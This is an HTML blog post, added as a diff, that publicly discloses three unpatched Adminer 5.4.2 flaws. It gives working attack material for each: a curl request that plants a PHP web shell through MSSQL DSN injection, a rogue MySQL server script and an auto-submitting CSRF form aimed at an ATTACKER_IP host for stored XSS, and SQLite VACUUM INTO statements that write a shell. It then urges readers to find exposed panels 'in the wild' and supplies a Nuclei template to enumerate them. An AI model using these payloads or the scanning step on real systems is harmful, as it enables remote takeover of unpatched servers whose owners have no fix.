@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Three 0-Day Vulnerabilities in Adminer · Voorivex Team</title>
+<meta name="description" content="Three 0-days from a single source review of Adminer 5.4.2. A pre-auth RCE in the MSSQL driver, a stored XSS that bypasses CSP via a rogue MySQL server, and an authenticated SQLite RCE that walks around the existing blocklist. Reported to the vendor on 6 April. No response yet." />
+
+<link rel="canonical" href="https://blog.voorivex.team/three-0-day-vulnerabilities-in-adminer" />
+
+<meta property="og:site_name" content="Voorivex Team" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Three 0-Day Vulnerabilities in Adminer" />
+<meta property="og:description" content="Three 0-days from a single source review of Adminer 5.4.2. A pre-auth RCE in the MSSQL driver, a stored XSS that bypasses CSP via a rogue MySQL server, and an authenticated SQLite RCE that walks around the existing blocklist. Reported to the vendor on 6 April. No response yet." />
+<meta property="og:url" content="https://blog.voorivex.team/three-0-day-vulnerabilities-in-adminer" />
+<meta property="og:image" content="https://blog.voorivex.team/assets/og-three-0-day-vulnerabilities-in-adminer.png" />
+<meta property="og:image:secure_url" content="https://blog.voorivex.team/assets/og-three-0-day-vulnerabilities-in-adminer.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:image:alt" content="Three 0-Day Vulnerabilities in Adminer · Voorivex Team" />
+<meta property="article:published_time" content="2026-06-09T00:00:00Z" />
+<meta property="article:section" content="Web · 0-Day · PHP" />
+<meta property="article:author" content="Yashar Shahinzadeh" />
+<meta property="article:author" content="Amirmohammad Safari" />
+<meta property="article:tag" content="adminer" />
+<meta property="article:tag" content="php" />
+<meta property="article:tag" content="rce" />
+<meta property="article:tag" content="xss" />
+<meta property="article:tag" content="0-day" />
+<meta property="article:tag" content="web" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="@voorivex" />
+<meta name="twitter:title" content="Three 0-Day Vulnerabilities in Adminer" />
+<meta name="twitter:description" content="Three 0-days from a single source review of Adminer 5.4.2. A pre-auth RCE in the MSSQL driver, a stored XSS that bypasses CSP via a rogue MySQL server, and an authenticated SQLite RCE that walks around the existing blocklist. Reported to the vendor on 6 April. No response yet." />
+<meta name="twitter:image" content="https://blog.voorivex.team/assets/og-three-0-day-vulnerabilities-in-adminer.png" />
+<meta name="twitter:image:alt" content="Three 0-Day Vulnerabilities in Adminer · Voorivex Team" />
+
+<link rel="icon" href="/favicon.ico" sizes="any" />
+<link rel="icon" href="/assets/favicon-32.png" type="image/png" sizes="32x32" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Lato:wght@400;700&family=Ubuntu:wght@400;500;700&family=Roboto:wght@400;500;700&family=Open+Sans:wght@400;600;700&family=Montserrat:wght@400;500;600;700&family=Geist:wght@400;500;600&family=Geist+Mono:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="assets/style.css?v=1781032528" />
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Three 0-Day Vulnerabilities in Adminer",
+  "description": "Three 0-days from a single source review of Adminer 5.4.2. A pre-auth RCE in the MSSQL driver, a stored XSS that bypasses CSP via a rogue MySQL server, and an authenticated SQLite RCE that walks around the existing blocklist. Reported to the vendor on 6 April. No response yet.",
+  "image": "https://blog.voorivex.team/assets/og-three-0-day-vulnerabilities-in-adminer.png",
+  "datePublished": "2026-06-09T00:00:00Z",
+  "dateModified": "2026-06-09T00:00:00Z",
+  "author": [
+    { "@type": "Person", "name": "Yashar Shahinzadeh" },
+    { "@type": "Person", "name": "Amirmohammad Safari" }
+  ],
+  "publisher": {
+    "@type": "Organization",
+    "name": "Voorivex Team",
+    "url": "https://blog.voorivex.team",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://blog.voorivex.team/assets/og.png"
+    }
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://blog.voorivex.team/three-0-day-vulnerabilities-in-adminer"
+  },
+  "articleSection": "Web · 0-Day · PHP",
+  "keywords": "adminer, php, rce, xss, 0-day, web",
+  "url": "https://blog.voorivex.team/three-0-day-vulnerabilities-in-adminer"
+}
+</script>
+<meta name="keywords" content="adminer, php, rce, xss, 0-day, web" />
+</head>
+<body>
+
+<header class="masthead">
+  <a href="/" class="masthead__logo">Voorivex Team</a>
+  <nav class="masthead__nav">
+    <a href="/" class="is-active">Posts</a>
+    <a href="/authors">Authors</a>
+    <a href="/tags">Tags</a>
+    <a href="/cdn-cgi/l/email-protection#cdb4acbea5acbf8dbba2a2bfa4bba8b5e3b9a8aca0">Contact</a>
+  </nav>
+</header>
+
+<article class="article">
+
+  <a href="/" class="article__back">All posts</a>
+
+  <header class="article__head">
+    <div class="article__meta">
+      <span class="kicker">Web · 0-Day · PHP</span>
+      <span class="dot">·</span>
+      <time datetime="2026-06-09">9 Jun 2026</time>
+      <span class="dot">·</span>
+      <span>13 min read</span>
+    </div>
+
+    <h1 class="article__title">Three 0-Day Vulnerabilities in Adminer</h1>
+
+    <p class="article__lede">
+      Three 0-days from a single source review of Adminer 5.4.2. A pre-auth
+      RCE in the MSSQL driver, a stored XSS that bypasses CSP via a rogue
+      MySQL server, and an authenticated SQLite RCE that walks around the
+      existing blocklist. Reported to the vendor on 6 April. No response
+      yet.
+    </p>
+
+    <div class="byline">
+      <div class="byline__avatars" aria-hidden="true">
+        <span class="avatar" data-tone="amber" title="Yashar Shahinzadeh"><img src="assets/avatars/yashar-shahinzadeh.png" alt="" /></span>
+        <span class="avatar" data-tone="lime" title="Amirmohammad Safari"><img src="assets/avatars/amirmohammad-safari.png" alt="" /></span>
+      </div>
+      <div class="byline__copy">
+        <span class="byline__label">Written by</span>
+        <span class="byline__names"><a href="/authors/yashar-shahinzadeh">Yashar Shahinzadeh</a><span class="byline__sep">·</span><a href="/authors/amirmohammad-safari">Amirmohammad Safari</a></span>
+      </div>
+    </div>
+  </header>
+
+  <div class="article__body">
+
+    <p>
+      Adminer is a single PHP file that you drop into your web root and get
+      a full database admin panel out of it. That makes it convenient. It
+      also makes it one of the most exposed admin panels on the internet,
+      because anybody who deployed it once and forgot about it left a login
+      page sitting on production, indexed by Google and pickable by a
+      scanner.
+    </p>
+
+    <p>
+      We have been here before. Years ago
+      <a href="https://x.com/yshahinzadeh">Yashar</a> found a way to abuse
+      a publicly reachable Adminer on a private bug bounty program to read
+      arbitrary files from the host, and wrote it up
+      <a href="https://infosecwriteups.com/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">here</a>.
+      He never reported the underlying issue to Adminer; he just used it
+      once on the program that paid for it and moved on. The class itself
+      got a CVE of its own a few years later,
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43008">CVE-2021-43008</a>,
+      after somebody else rediscovered it and reported it properly. That
+      bug is long gone now, but it left a habit: every couple of years one
+      of us opens the latest Adminer and reads it. This year was that
+      year.
+    </p>
+
+    <p>
+      Amir and I decided to take a look at Adminer for fun, and of course
+      to make some money as we've done before. We pulled the current
+      single-file build, <code>adminer-5.4.2.php</code>, and read it from
+      top to bottom over a couple of sessions. By the end of the pass we
+      had three 0-days: a pre-auth remote code execution against any
+      Adminer connected to an MSSQL/Azure SQL backend, a stored XSS that
+      bypasses Adminer's CSP through a rogue MySQL server, and an
+      authenticated remote code execution against SQLite that walks around
+      the existing blocklist. We reported the full set to the maintainer
+      via GitHub on <code>6 April 2026</code> and followed up on
+      <code>13 April</code>. As of this writing, over two months later,
+      there has still been no acknowledgement. If there had been any, we
+      would not be publishing today.
+    </p>
+
+    <p>
+      The customers who keep Adminer reachable on production deserve to
+      know what is sitting on their hosts. This post is the closest thing
+      to a public advisory the bugs will get until the vendor moves.
+    </p>
+
+    <h2>Discovery</h2>
+
+    <p>
+      The compact build we tested is the official
+      <code>adminer-5.4.2.php</code> from adminer.org, the latest stable at
+      the time we audited it. For the audit itself we read the split
+      source from the GitHub repo at tag <code>v5.4.2</code>, because that
+      tree has the original file paths and line numbers we wanted to cite.
+      The repo also carries plugins, the Editor variant, and other assets
+      that are not part of the default compact build; we ignored those and
+      read what actually ships in the single-file binary.
+    </p>
+
+    <p>
+      Adminer is small: a few hundred KB of PHP that connects to and
+      manages a handful of database drivers behind one login form. We read
+      it end-to-end and walked out with three issues.
+    </p>
+
+    <h2>Bug 1: Pre-Auth RCE via MSSQL DSN Injection</h2>
+
+    <p>
+      The first bug is the most interesting one. It is a pre-auth remote
+      code execution that fires on any Adminer running on top of
+      <code>pdo_sqlsrv</code>, which is the standard PHP extension for
+      connecting to Microsoft SQL Server and Azure SQL. The vulnerable
+      line lives in the MSSQL driver,
+      <code>adminer/drivers/mssql.inc.php</code> at line 185:
+    </p>
+
+    <pre data-lang="php"><code><span class="k">if</span> (<span class="f">extension_loaded</span>(<span class="s">"pdo_sqlsrv"</span>)) {
+    <span class="k">class</span> Db <span class="k">extends</span> MssqlDb {
+        <span class="k">public</span> $extension = <span class="s">"PDO_SQLSRV"</span>;
+
+        <span class="k">function</span> <span class="f">attach</span>(<span class="k">string</span> $server, <span class="k">string</span> $username, <span class="k">string</span> $password): <span class="k">string</span> {
+            <span class="f">list</span>($host, $port) = <span class="f">host_port</span>($server);
+            <span class="k">return</span> $this-&gt;<span class="f">dsn</span>(<span class="s">"sqlsrv:Server=$host"</span> . ($port ? <span class="s">",$port"</span> : <span class="s">""</span>), $username, $password);
+        }
+    }
+}</code></pre>
+
+    <p>
+      The driver builds an ODBC DSN string by concatenating the
+      user-controlled <code>$host</code> value into a template, then hands
+      the result to PDO. There is no escaping anywhere on this path.
+      <code>host_port()</code> (in
+      <code>include/functions.inc.php:851</code>) is a thin regex that
+      splits an IPv6 bracket form like <code>[::1]:1433</code> into host
+      and port; if the input does not match that pattern it returns the
+      original string unchanged, which is the common case. So whatever we
+      type into the login form's <code>server</code> field lands directly
+      inside the DSN.
+    </p>
+
+    <p>
+      ODBC treats semicolons as DSN parameter delimiters. That means a
+      semicolon in the server name lets us append arbitrary ODBC options
+      to the connection string. The two options worth knowing about here
+      are <code>TraceFile</code> and <code>TraceOn</code>. When these are
+      present the ODBC driver writes a trace of the attempted connection
+      to a file we name, before the connection itself succeeds, and the
+      trace contains the literal connection string including the
+      <code>UID={...}</code> field. The username we submit in the login
+      form goes directly into that <code>UID={...}</code> field, raw. So
+      if we put PHP code in the username, the ODBC driver politely writes
+      that PHP code to a file of our choosing.
+    </p>
+
+    <p>The end-to-end primitive looks like this:</p>
+
+    <pre data-lang="bash"><code><span class="f">curl</span> <span class="s">"http://target.tld/adminer.php"</span> -L -c - \
+  -d <span class="s">"auth[driver]=mssql"</span> \
+  -d <span class="s">"auth[server]=127.0.0.1;TraceFile=shell.php;TraceOn=1"</span> \
+  --data-urlencode <span class="s">"auth[username]=&lt;?php system(\$_GET['c']); ?&gt;"</span> \
+  -d <span class="s">"auth[password]=x"</span></code></pre>
+
+    <p>
+      The DSN that Adminer ends up handing to PDO is
+      <code>sqlsrv:Server=127.0.0.1;TraceFile=shell.php;TraceOn=1</code>.
+      The ODBC driver opens the trace file, writes the connection metadata
+      into it (including our <code>&lt;?php</code> payload as part of
+      <code>UID={...}</code>), then tries to connect to
+      <code>127.0.0.1</code> and fails. The failure does not matter. The
+      file has already been written next to <code>adminer.php</code> in
+      the web root. One request later we have a shell:
+    </p>
+
+    <pre data-lang="bash"><code><span class="f">curl</span> <span class="s">"http://target.tld/shell.php?c=id"</span>
+<span class="c"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
+
+    <p>
+      Pre-auth. No valid SQL Server needed. No credentials. The login
+      attempt fails by design.
+    </p>
+
+    <p>
+      The preconditions are narrow but realistic. The target needs
+      <code>pdo_sqlsrv</code> loaded and the Microsoft ODBC Driver for SQL
+      Server installed, which is exactly the configuration you get on a
+      server that talks to Azure SQL Database or a Microsoft SQL Server
+      backend. The web root also needs to be writable by the PHP worker,
+      which is the default on a lot of containerized PHP setups. The same
+      shape exists in the sibling <code>pdo_dblib</code> branch at line
+      195 of the same file, where the DSN template is
+      <code>dblib:charset=utf8;host=$host</code>; we did not chase a
+      gadget on that one because we did not have a reachable dblib install
+      to confirm against, but the code is identical and we suspect it is
+      equivalent.
+    </p>
+
+    <h2>Bug 2: Stored XSS via Rogue MySQL Server (CSP Nonce Bypass)</h2>
+
+    <p>
+      The second bug is more fun than dangerous, but it is technically a
+      stored XSS that bypasses Adminer's CSP in a fully supported way. It
+      needs an attacker-controlled MySQL server, which sounds like a heavy
+      precondition until you remember that the login form has no CSRF
+      token, and Adminer is happy to call out to any MySQL host you give
+      it.
+    </p>
+
+    <p>
+      The sink is in <code>adminer/include/adminer.inc.php</code> at line
+      1081:
+    </p>
+
+    <pre data-lang="php"><code><span class="k">echo</span> <span class="f">script</span>(<span class="s">"syntaxHighlighting('"</span> . <span class="f">preg_replace</span>(<span class="s">'~^(\d\.?\d).*~s'</span>, <span class="s">'\1'</span>, <span class="f">connection</span>()-&gt;server_info) . <span class="s">"', '"</span> . <span class="f">connection</span>()-&gt;flavor . <span class="s">"');"</span>);</code></pre>
+
+    <p>
+      <code>connection()-&gt;server_info</code> is whatever string the
+      database server returned in its handshake. For MySQL that is the
+      version string sitting in the initial Greeting packet, completely
+      controlled by whoever runs the server we are talking to. Adminer
+      assumes it will always look like <code>5.7.38</code> or
+      <code>10.11.5-MariaDB</code>, so it runs a <code>preg_replace</code>
+      with the anchored pattern <code>~^(\d\.?\d).*~s</code> to extract
+      the first two digits.
+    </p>
+
+    <p>
+      The interesting property of <code>preg_replace</code> is that when
+      the pattern fails to match, it returns the original input unchanged.
+      The pattern here only matches input that starts with a digit
+      followed optionally by a dot and another digit. Send a version
+      string that does not start with a digit and the regex falls through;
+      the raw string is concatenated into the JavaScript, inside a
+      <code>&lt;script&gt;</code> tag that <code>script()</code> (in
+      <code>include/html.inc.php:5</code>) wraps with a valid CSP nonce:
+    </p>
+
+    <pre data-lang="php"><code><span class="k">function</span> <span class="f">script</span>(<span class="k">string</span> $source, <span class="k">string</span> $trailing = <span class="s">"\n"</span>): <span class="k">string</span> {
+    <span class="k">return</span> <span class="s">"&lt;script"</span> . <span class="f">nonce</span>() . <span class="s">"&gt;$source&lt;/script&gt;$trailing"</span>;
+}</code></pre>
+
+    <p>
+      So we win twice. The injection is reflected into a script context,
+      and the script tag carries the legitimate per-request nonce, which
+      means the browser's strict CSP does not block it. The payload runs.
+    </p>
+
+    <p>
+      The minimum rogue MySQL server you need is about 80 lines of Python
+      that speaks just enough of the MySQL protocol to send a Greeting
+      packet with a custom version string and accept any login. We had
+      this:
+    </p>
+
+    <pre data-lang="python"><code><span class="k">import</span> socket, struct, threading
+
+PAYLOAD = <span class="s">"1');alert(origin)//"</span>
+
+CAP_PROTOCOL_41       = <span class="s">0x0200</span>
+CAP_SECURE_CONNECTION = <span class="s">0x8000</span>
+CAP_PLUGIN_AUTH       = <span class="s">0x00080000</span>
+CAPS_LOW  = CAP_PROTOCOL_41 | CAP_SECURE_CONNECTION
+CAPS_HIGH = (CAP_PLUGIN_AUTH &gt;&gt; <span class="s">16</span>)
+
+<span class="k">def</span> <span class="f">make_packet</span>(seq, payload):
+    length = struct.<span class="f">pack</span>(<span class="s">"&lt;I"</span>, <span class="f">len</span>(payload))[:<span class="s">3</span>]
+    <span class="k">return</span> length + <span class="f">bytes</span>([seq]) + payload
+
+<span class="k">def</span> <span class="f">make_greeting</span>(version_str):
+    pkt  = <span class="s">b"\x0a"</span>                                  <span class="c"># protocol version 10</span>
+    pkt += version_str.<span class="f">encode</span>() + <span class="s">b"\x00"</span>            <span class="c"># version string  &lt;-- attacker controlled</span>
+    pkt += struct.<span class="f">pack</span>(<span class="s">"&lt;I"</span>, <span class="s">1</span>)                      <span class="c"># connection id</span>
+    pkt += <span class="s">b"\x41"</span> * <span class="s">8</span>                               <span class="c"># auth plugin data part 1</span>
+    pkt += <span class="s">b"\x00"</span>                                   <span class="c"># filler</span>
+    pkt += struct.<span class="f">pack</span>(<span class="s">"&lt;H"</span>, CAPS_LOW)
+    pkt += <span class="s">b"\x21"</span>                                   <span class="c"># charset utf8</span>
+    pkt += struct.<span class="f">pack</span>(<span class="s">"&lt;H"</span>, <span class="s">0x0002</span>)                 <span class="c"># status flags</span>
+    pkt += struct.<span class="f">pack</span>(<span class="s">"&lt;H"</span>, CAPS_HIGH)
+    pkt += <span class="s">b"\x15"</span>                                   <span class="c"># auth data length (21)</span>
+    pkt += <span class="s">b"\x00"</span> * <span class="s">10</span>
+    pkt += <span class="s">b"\x41"</span> * <span class="s">12</span> + <span class="s">b"\x00"</span>
+    pkt += <span class="s">b"mysql_native_password\x00"</span>
+    <span class="k">return</span> <span class="f">make_packet</span>(<span class="s">0</span>, pkt)
+
+<span class="k">def</span> <span class="f">make_ok</span>(seq):
+    pkt  = <span class="s">b"\x00\x00\x00"</span>
+    pkt += struct.<span class="f">pack</span>(<span class="s">"&lt;H"</span>, <span class="s">0x0002</span>)
+    pkt += struct.<span class="f">pack</span>(<span class="s">"&lt;H"</span>, <span class="s">0</span>)
+    <span class="k">return</span> <span class="f">make_packet</span>(seq, pkt)
+
+<span class="k">def</span> <span class="f">make_err</span>(seq, msg=<span class="s">b"not supported"</span>):
+    pkt  = <span class="s">b"\xff"</span>
+    pkt += struct.<span class="f">pack</span>(<span class="s">"&lt;H"</span>, <span class="s">1045</span>)
+    pkt += <span class="s">b"#HY000"</span>
+    pkt += msg
+    <span class="k">return</span> <span class="f">make_packet</span>(seq, pkt)
+
+<span class="k">def</span> <span class="f">handle</span>(conn):
+    conn.<span class="f">sendall</span>(<span class="f">make_greeting</span>(PAYLOAD))
+    <span class="k">try</span>: conn.<span class="f">recv</span>(<span class="s">4096</span>)
+    <span class="k">except</span>: conn.<span class="f">close</span>(); <span class="k">return</span>
+    conn.<span class="f">sendall</span>(<span class="f">make_ok</span>(<span class="s">2</span>))
+    <span class="k">while</span> <span class="k">True</span>:
+        <span class="k">try</span>:
+            data = conn.<span class="f">recv</span>(<span class="s">4096</span>)
+            <span class="k">if</span> <span class="k">not</span> data: <span class="k">break</span>
+            conn.<span class="f">sendall</span>(<span class="f">make_err</span>(data[<span class="s">3</span>] + <span class="s">1</span>))
+        <span class="k">except</span>: <span class="k">break</span>
+    conn.<span class="f">close</span>()
+
+srv = socket.<span class="f">socket</span>()
+srv.<span class="f">setsockopt</span>(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="s">1</span>)
+srv.<span class="f">bind</span>((<span class="s">"0.0.0.0"</span>, <span class="s">3307</span>))
+srv.<span class="f">listen</span>(<span class="s">5</span>)
+<span class="f">print</span>(<span class="s">"[*] Rogue MySQL on :3307 - version:"</span>, PAYLOAD)
+<span class="k">while</span> <span class="k">True</span>:
+    conn, _ = srv.<span class="f">accept</span>()
+    threading.<span class="f">Thread</span>(target=handle, args=(conn,)).<span class="f">start</span>()</code></pre>
+
+    <p>
+      Point the victim Adminer at this server, log in as anyone, and the
+      dashboard renders with:
+    </p>
+
+    <pre data-lang="html"><code>&lt;script nonce="REAL_NONCE_VALUE"&gt;syntaxHighlighting('1');alert(origin)//', 'mysql');&lt;/script&gt;</code></pre>
+
+    <p>
+      <code>alert(origin)</code> runs. Because the login form has no CSRF
+      token, the precondition can be satisfied from a remote attacker
+      page without any user action beyond visiting the page:
+    </p>
+
+    <pre data-lang="html"><code>&lt;form id="f" method="POST" action="http://target.tld/adminer.php"&gt;
+  &lt;input name="auth[driver]" value="server"&gt;
+  &lt;input name="auth[server]" value="ATTACKER_IP:3307"&gt;
+  &lt;input name="auth[username]" value="root"&gt;
+  &lt;input name="auth[password]" value="x"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</code></pre>
+
+    <p>
+      The victim visits the page. Their browser POSTs the login. Adminer
+      connects out to the attacker's MySQL server, receives the malicious
+      version string, renders the dashboard, and runs the payload in the
+      origin of the victim's Adminer.
+    </p>
+
+    <h2>Bug 3: Authenticated RCE via SQLite VACUUM INTO</h2>
+
+    <p>
+      The last one is small and slightly funny. Adminer's authors clearly
+      thought about the obvious SQLite-to-RCE path, because they put it
+      on a blocklist. They just forgot that SQLite has more than one way
+      to write a file. The relevant code is in
+      <code>adminer/sql.inc.php</code> at line 121:
+    </p>
+
+    <pre data-lang="php"><code><span class="k">if</span> (JUSH == <span class="s">"sqlite"</span> &amp;&amp; <span class="f">preg_match</span>(<span class="s">"~^$space*+ATTACH\\b~i"</span>, $q, $match)) {
+    <span class="c">// PHP doesn't support setting SQLITE_LIMIT_ATTACHED</span>
+    <span class="k">echo</span> <span class="s">"&lt;p class='error'&gt;"</span> . <span class="f">lang</span>(<span class="s">'ATTACH queries are not supported.'</span>) . <span class="s">"\n"</span>;
+}</code></pre>
+
+    <p>
+      The blocklist matches any query that starts with <code>ATTACH</code>.
+      The historical reason this exists is that
+      <code>ATTACH DATABASE 'shell.php'</code> is the textbook
+      SQLite-to-PHP-shell primitive: SQLite creates the database file
+      with the given name and extension, and if the file contains
+      arbitrary attacker-supplied bytes (for example as a table name),
+      PHP will happily parse the bytes between <code>&lt;?php ... ?&gt;</code>
+      and execute them.
+    </p>
+
+    <p>
+      What the blocklist does not cover is <code>VACUUM INTO</code>,
+      available since SQLite 3.27.0. <code>VACUUM INTO 'path.php'</code>
+      does almost exactly the same thing as <code>ATTACH</code>: it
+      writes the current database to a new file at an arbitrary path with
+      an arbitrary extension. The blocklist regex starts with
+      <code>ATTACH\b</code>, so a query starting with <code>VACUUM</code>
+      walks straight through.
+    </p>
+
+    <p>The full chain, after logging into the SQLite driver:</p>
+
+    <pre data-lang="sql"><code><span class="k">CREATE TABLE</span> <span class="s">"&lt;?php system($_GET['c']); ?&gt;"</span> (i <span class="k">int</span>);
+<span class="k">VACUUM INTO</span> <span class="s">'/var/www/html/shell.php'</span>;</code></pre>
+
+    <p>
+      The first statement creates a table whose name is the PHP payload.
+      SQLite stores table names as literal UTF-8 bytes inside the database
+      file. <code>VACUUM INTO</code> then writes the whole database to
+      <code>/var/www/html/shell.php</code>. PHP's parser scans the
+      resulting file, hits the <code>&lt;?php</code> marker somewhere in
+      the middle of the SQLite binary content, and runs everything
+      between it and the closing <code>?&gt;</code>. We have a shell:
+    </p>
+
+    <pre data-lang="bash"><code><span class="f">curl</span> <span class="s">"http://target.tld/shell.php?c=id"</span>
+<span class="c"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
+
+    <p>
+      This one is post-auth, so it is meaningfully less severe than Bug
+      1, but SQLite-backed Adminer instances are often left with default
+      or empty credentials, and an attacker who has compromised any
+      low-privilege account on the database has the same primitive.
+    </p>
+
+    <h2>Takeaway</h2>
+
+    <p>
+      We found these 0-days the same way we found the
+      <a href="https://blog.voorivex.team/two-cpanel-zero-day-vulnerabilities">cPanel ones</a>
+      a few weeks ago: by reading source. Once we had the bugs, we ran
+      them across the bug bounty programs we have access to and reported
+      every match. The bounties from those two campaigns combined came
+      out in five figures. The number mattered less than what we were
+      actually after, which was a whitebox audit on real targets, the fun
+      of it, and a check on our own instincts after years of blackbox
+      work.
+    </p>
+
+    <p>
+      If you want to find these in the wild, the only real prerequisite
+      is being able to identify exposed Adminer panels. Since there is no
+      patch out yet, any panel you can reach is at least exploitable for
+      the XSS, because Bug 2 has no host-side preconditions; depending on
+      the database driver underneath, the same panel can chain further
+      into RCE.
+    </p>
+
+    <p>
+      There is already an
+      <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/exposed-panels/adminer-panel-detect.yaml">official Nuclei template</a>
+      for detecting Adminer panels, but in practice it missed enough live
+      instances that we wrote our own to catch more of them. Ours
+      enumerates the common deployment filenames Adminer ships with plus
+      a few aliases people use, and confirms the panel via the page title
+      and a footer string. We are dropping it here so you can use it too.
+    </p>
+
+    <pre data-lang="yaml"><code>id: adminer-panel
+
+info:
+  name: Adminer Login Panel - Detect
+  author: yshahinzadeh,amirmsafari
+  severity: info
+  description: An Adminer login panel was detected.
+  tags: panel,adminer,discovery
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/adminer-5.0.0.php'
+      - '{{BaseURL}}/adminer-5.0.1.php'
+      - '{{BaseURL}}/adminer-5.0.2.php'
+      - '{{BaseURL}}/adminer-5.0.3.php'
+      - '{{BaseURL}}/adminer-5.0.4.php'
+      - '{{BaseURL}}/adminer-5.0.5.php'
+      - '{{BaseURL}}/adminer-5.0.6.php'
+      - '{{BaseURL}}/adminer-5.1.0.php'
+      - '{{BaseURL}}/adminer-5.1.1.php'
+      - '{{BaseURL}}/adminer-5.2.0.php'
+      - '{{BaseURL}}/adminer-5.2.1.php'
+      - '{{BaseURL}}/adminer-5.3.0.php'
+      - '{{BaseURL}}/adminer-5.4.0.php'
+      - '{{BaseURL}}/adminer-5.4.1.php'
+      - '{{BaseURL}}/adminer-5.4.2.php'
+      - '{{BaseURL}}/adminer-5.0.0-en.php'
+      - '{{BaseURL}}/adminer-5.0.1-en.php'
+      - '{{BaseURL}}/adminer-5.0.2-en.php'
+      - '{{BaseURL}}/adminer-5.0.3-en.php'
+      - '{{BaseURL}}/adminer-5.0.4-en.php'
+      - '{{BaseURL}}/adminer-5.0.5-en.php'
+      - '{{BaseURL}}/adminer-5.0.6-en.php'
+      - '{{BaseURL}}/adminer-5.1.0-en.php'
+      - '{{BaseURL}}/adminer-5.1.1-en.php'
+      - '{{BaseURL}}/adminer-5.2.0-en.php'
+      - '{{BaseURL}}/adminer-5.2.1-en.php'
+      - '{{BaseURL}}/adminer-5.3.0-en.php'
+      - '{{BaseURL}}/adminer-5.4.0-en.php'
+      - '{{BaseURL}}/adminer-5.4.1-en.php'
+      - '{{BaseURL}}/adminer-5.4.2-en.php'
+      - '{{BaseURL}}/adminer-5.0.0-mysql.php'
+      - '{{BaseURL}}/adminer-5.0.1-mysql.php'
+      - '{{BaseURL}}/adminer-5.0.2-mysql.php'
+      - '{{BaseURL}}/adminer-5.0.3-mysql.php'
+      - '{{BaseURL}}/adminer-5.0.4-mysql.php'
+      - '{{BaseURL}}/adminer-5.0.5-mysql.php'
+      - '{{BaseURL}}/adminer-5.0.6-mysql.php'
+      - '{{BaseURL}}/adminer-5.1.0-mysql.php'
+      - '{{BaseURL}}/adminer-5.1.1-mysql.php'
+      - '{{BaseURL}}/adminer-5.2.0-mysql.php'
+      - '{{BaseURL}}/adminer-5.2.1-mysql.php'
+      - '{{BaseURL}}/adminer-5.3.0-mysql.php'
+      - '{{BaseURL}}/adminer-5.4.0-mysql.php'
+      - '{{BaseURL}}/adminer-5.4.1-mysql.php'
+      - '{{BaseURL}}/adminer-5.4.2-mysql.php'
+      - '{{BaseURL}}/adminer-5.0.0-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.0.1-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.0.2-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.0.3-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.0.4-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.0.5-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.0.6-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.1.0-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.1.1-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.2.0-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.2.1-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.3.0-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.4.0-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.4.1-mysql-en.php'
+      - '{{BaseURL}}/adminer-5.4.2-mysql-en.php'
+      - '{{BaseURL}}/adminer.php'
+      - '{{BaseURL}}/_adminer.php'
+      - '{{BaseURL}}/sql.php'
+      - '{{BaseURL}}/mysql.php'
+      - '{{BaseURL}}/editor.php'
+      - '{{BaseURL}}' # Adminer Docker Image Launch it on root
+
+    headers:
+      Accept-Language: en-US,en;q=0.5
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Adminer&lt;/title&gt;"
+          - "Adminer&lt;/a&gt;"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '&lt;span class="version"&gt;([0-9.]+)'</code></pre>
+
+  </div>
+</article>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
+</html>
